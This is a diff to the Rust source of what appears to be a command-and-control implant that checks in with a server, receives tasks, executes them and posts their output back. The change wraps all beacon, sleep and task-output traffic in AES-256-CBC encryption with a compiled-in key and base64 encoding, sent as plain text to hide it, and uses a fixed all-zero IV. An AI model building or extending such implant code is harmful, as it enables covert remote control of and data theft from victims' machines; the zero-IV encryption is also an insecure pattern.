@@ -6,6 +6,13 @@ use std::ffi::CString;
 use std::thread::sleep;
 use std::time::Duration;
 
+use openssl::symm::{Cipher, Crypter, Mode};
+use base64::{
+    alphabet,
+    engine::{self, general_purpose},
+    Engine as _,
+};
+
 mod func;
 //this is the struct that we will use to send our info to the server
 #[derive(Serialize, Deserialize, Debug)]
@@ -128,13 +135,49 @@ fn send_request(imp_info: ImpInfo) {
                                                                  .unwrap();
                                                              */
 
-            let request_body = match serde_json::to_string(&imp_info) {
-                Ok(json) => json, // Directly use the JSON string
-                Err(_) => {
-                    //println!("Failed to serialize ImpInfo.");
-                    return;
-                }
-            };
+            //add AES encryption here
+            let serialized_data =
+            serde_json::to_string(&imp_info).expect("Failed to serialize output data");
+
+            // Load the public key from the environment variable
+            let encoded_aes_key = env!("AES_KEY");
+
+            //base64 decode the aes key
+
+            let aes_key = decode(encoded_aes_key).expect("Failed to decode AES key");
+            //let aes_key_bytes = aes_key.as_bytes();
+
+            // Initialize the AES encryption
+            let cipher = Cipher::aes_256_cbc();
+            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
+            let mut crypter = Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
+                .expect("Failed to create Crypter");
+
+            // Encrypt the data
+            let mut encrypted_data = vec![0; serialized_data.len() + cipher.block_size()];
+            let mut count = crypter
+                .update(serialized_data.as_bytes(), &mut encrypted_data)
+                .expect("Failed to encrypt data");
+            count += crypter
+                .finalize(&mut encrypted_data[count..])
+                .expect("Failed to finalize encryption");
+
+            // Truncate to the actual size of the encrypted data
+            encrypted_data.truncate(count);
+
+            let iv_clone = iv.clone();
+            let encrypted_data_clone = encrypted_data.clone();
+
+            // Print debug information
+            //println!("IV: {:?}", iv_clone);
+            //println!("Encrypted data length: {}", encrypted_data.len());
+            //println!("Encrypted data: {:?}", encrypted_data_clone);
+
+            // Base64 encode the encrypted data
+            let base64_encrypted_data = encode(&encrypted_data);
+
+            // Convert the encrypted data to a String
+            let request_body = String::from(base64_encrypted_data);
 
             // This is where we will send our check-in request
             let response = client
@@ -146,7 +189,7 @@ fn send_request(imp_info: ImpInfo) {
                 ))
                 .header("User-Agent", user_agent.to_str().unwrap())
                 .header("X-Unique-Identifier", header_value)
-                .header("Content-Type", "application/json")
+                .header("Content-Type", "text/plain")
                 .body(request_body) // Pass the owned String directly
                 .send();
 
@@ -210,8 +253,51 @@ fn send_request(imp_info: ImpInfo) {
                 sleep: imp_info.sleep.clone(),
             };
 
-            //need to add error handling to this unwrap
-            let json = serde_json::to_string(&sleep_time).unwrap();
+            let serialized_data = serde_json::to_string(&sleep_time)
+                    .expect("Failed to serialize output data");
+
+            // Load the public key from the environment variable
+            let encoded_aes_key = env!("AES_KEY");
+
+            //base64 decode the aes key
+
+            let aes_key =
+                decode(encoded_aes_key).expect("Failed to decode AES key");
+            //let aes_key_bytes = aes_key.as_bytes();
+
+            // Initialize the AES encryption
+            let cipher = Cipher::aes_256_cbc();
+            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
+            let mut crypter =
+                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
+                    .expect("Failed to create Crypter");
+
+            // Encrypt the data
+            let mut encrypted_data =
+                vec![0; serialized_data.len() + cipher.block_size()];
+            let mut count = crypter
+                .update(serialized_data.as_bytes(), &mut encrypted_data)
+                .expect("Failed to encrypt data");
+            count += crypter
+                .finalize(&mut encrypted_data[count..])
+                .expect("Failed to finalize encryption");
+
+            // Truncate to the actual size of the encrypted data
+            encrypted_data.truncate(count);
+
+            let iv_clone = iv.clone();
+            let encrypted_data_clone = encrypted_data.clone();
+
+            // Print debug information
+            //println!("IV: {:?}", iv_clone);
+            //println!("Encrypted data length: {}", encrypted_data.len());
+            //println!("Encrypted data: {:?}", encrypted_data_clone);
+
+            // Base64 encode the encrypted data
+            let base64_encrypted_data = encode(&encrypted_data);
+
+            // Convert the encrypted data to a String
+            let request_body = String::from(base64_encrypted_data);
 
             //send request to the index endpoint
 
@@ -224,8 +310,8 @@ fn send_request(imp_info: ImpInfo) {
                 ))
                 .header("User-Agent", user_agent.to_str().unwrap())
                 .header("X-Session", header_value.clone())
-                .header("Content-Type", "application/json")
-                .body(json)
+                .header("Content-Type", "text/plain")
+                .body(request_body)
                 .send();
 
             //check the response. if it is good, we'll capture the tasks in the response body and execute them
@@ -280,24 +366,53 @@ fn send_request(imp_info: ImpInfo) {
                                 output: output.clone(),       // Make sure output is a String
                             };
 
-                            //println!("task name before serialization: {}", task_name);
-                            //print output_data
-                            println!("Output data: {:?}", output_data);
-
-                            //TODO need to go back and serlialize data for the other endpoints maybe? not sure why i never did it before
                             let serialized_data = serde_json::to_string(&output_data)
                                 .expect("Failed to serialize output data");
 
-                            //send the serialized data to the server at the return_out endpoint, in the body
+                            // Load the public key from the environment variable
+                            let encoded_aes_key = env!("AES_KEY");
 
-                            let new_header_value = header_value.clone();
+                            //base64 decode the aes key
 
-                            let request_body = CString::new(serialized_data).unwrap();
+                            let aes_key =
+                                decode(encoded_aes_key).expect("Failed to decode AES key");
+                            //let aes_key_bytes = aes_key.as_bytes();
 
-                            let request_body_str = request_body
-                                .into_string()
-                                .expect("Failed to convert CString to String");
+                            // Initialize the AES encryption
+                            let cipher = Cipher::aes_256_cbc();
+                            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
+                            let mut crypter =
+                                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
+                                    .expect("Failed to create Crypter");
 
+                            // Encrypt the data
+                            let mut encrypted_data =
+                                vec![0; serialized_data.len() + cipher.block_size()];
+                            let mut count = crypter
+                                .update(serialized_data.as_bytes(), &mut encrypted_data)
+                                .expect("Failed to encrypt data");
+                            count += crypter
+                                .finalize(&mut encrypted_data[count..])
+                                .expect("Failed to finalize encryption");
+
+                            // Truncate to the actual size of the encrypted data
+                            encrypted_data.truncate(count);
+
+                            let iv_clone = iv.clone();
+                            let encrypted_data_clone = encrypted_data.clone();
+
+                            // Print debug information
+                            //println!("IV: {:?}", iv_clone);
+                            //println!("Encrypted data length: {}", encrypted_data.len());
+                            //println!("Encrypted data: {:?}", encrypted_data_clone);
+
+                            // Base64 encode the encrypted data
+                            let base64_encrypted_data = encode(&encrypted_data);
+
+                            // Convert the encrypted data to a String
+                            let request_body = String::from(base64_encrypted_data);
+
+                            // Send the return_out request
                             let response = client
                                 .post(&format!(
                                     "https://{}:{}{}",
@@ -306,9 +421,10 @@ fn send_request(imp_info: ImpInfo) {
                                     return_out_endpoint.to_str().unwrap()
                                 ))
                                 .header("User-Agent", user_agent.to_str().unwrap())
-                                .header("X-Session", new_header_value)
-                                .header("Content-Type", "application/json")
-                                .body(request_body_str) // Pass the owned String directly
+                                .header("X-Session", header_value.clone())
+                                .header("Content-Type", "text/plain") // Update Content-Type to text/plain
+                                // send the string data
+                                .body(request_body) // Assuming request_body is the string you want to send
                                 .send();
 
                             //check if the response is good. if it is, print "we made it" and continue the loop
@@ -398,4 +514,32 @@ fn send_request(imp_info: ImpInfo) {
         } //end of if !token.is_empty()
           //break;
     } //end of loop
+}
+
+pub fn encode(data: &[u8]) -> String {
+    // Define a custom encoding engine using the URL-safe alphabet and no padding.
+    const CUSTOM_ENGINE: engine::GeneralPurpose =
+    engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
+
+    // Encode the data using the custom encoding engine.
+    let content = CUSTOM_ENGINE.encode(data);
+
+    // Return the encoded content.
+    content
+
+}
+
+pub fn decode(data: &str) -> Result<Vec<u8>, String> {
+// Define a custom encoding engine using the URL-safe alphabet and no padding.
+const CUSTOM_ENGINE: engine::GeneralPurpose =
+    engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);
+
+// Decode the data using the custom encoding engine.
+let content_res = CUSTOM_ENGINE.decode(data);
+
+// Handle the result and return the decoded content or an error.
+match content_res {
+    Ok(content) => Ok(content),
+    Err(e) => Err(format!("Error decoding data: {}", e)),
+}
 }
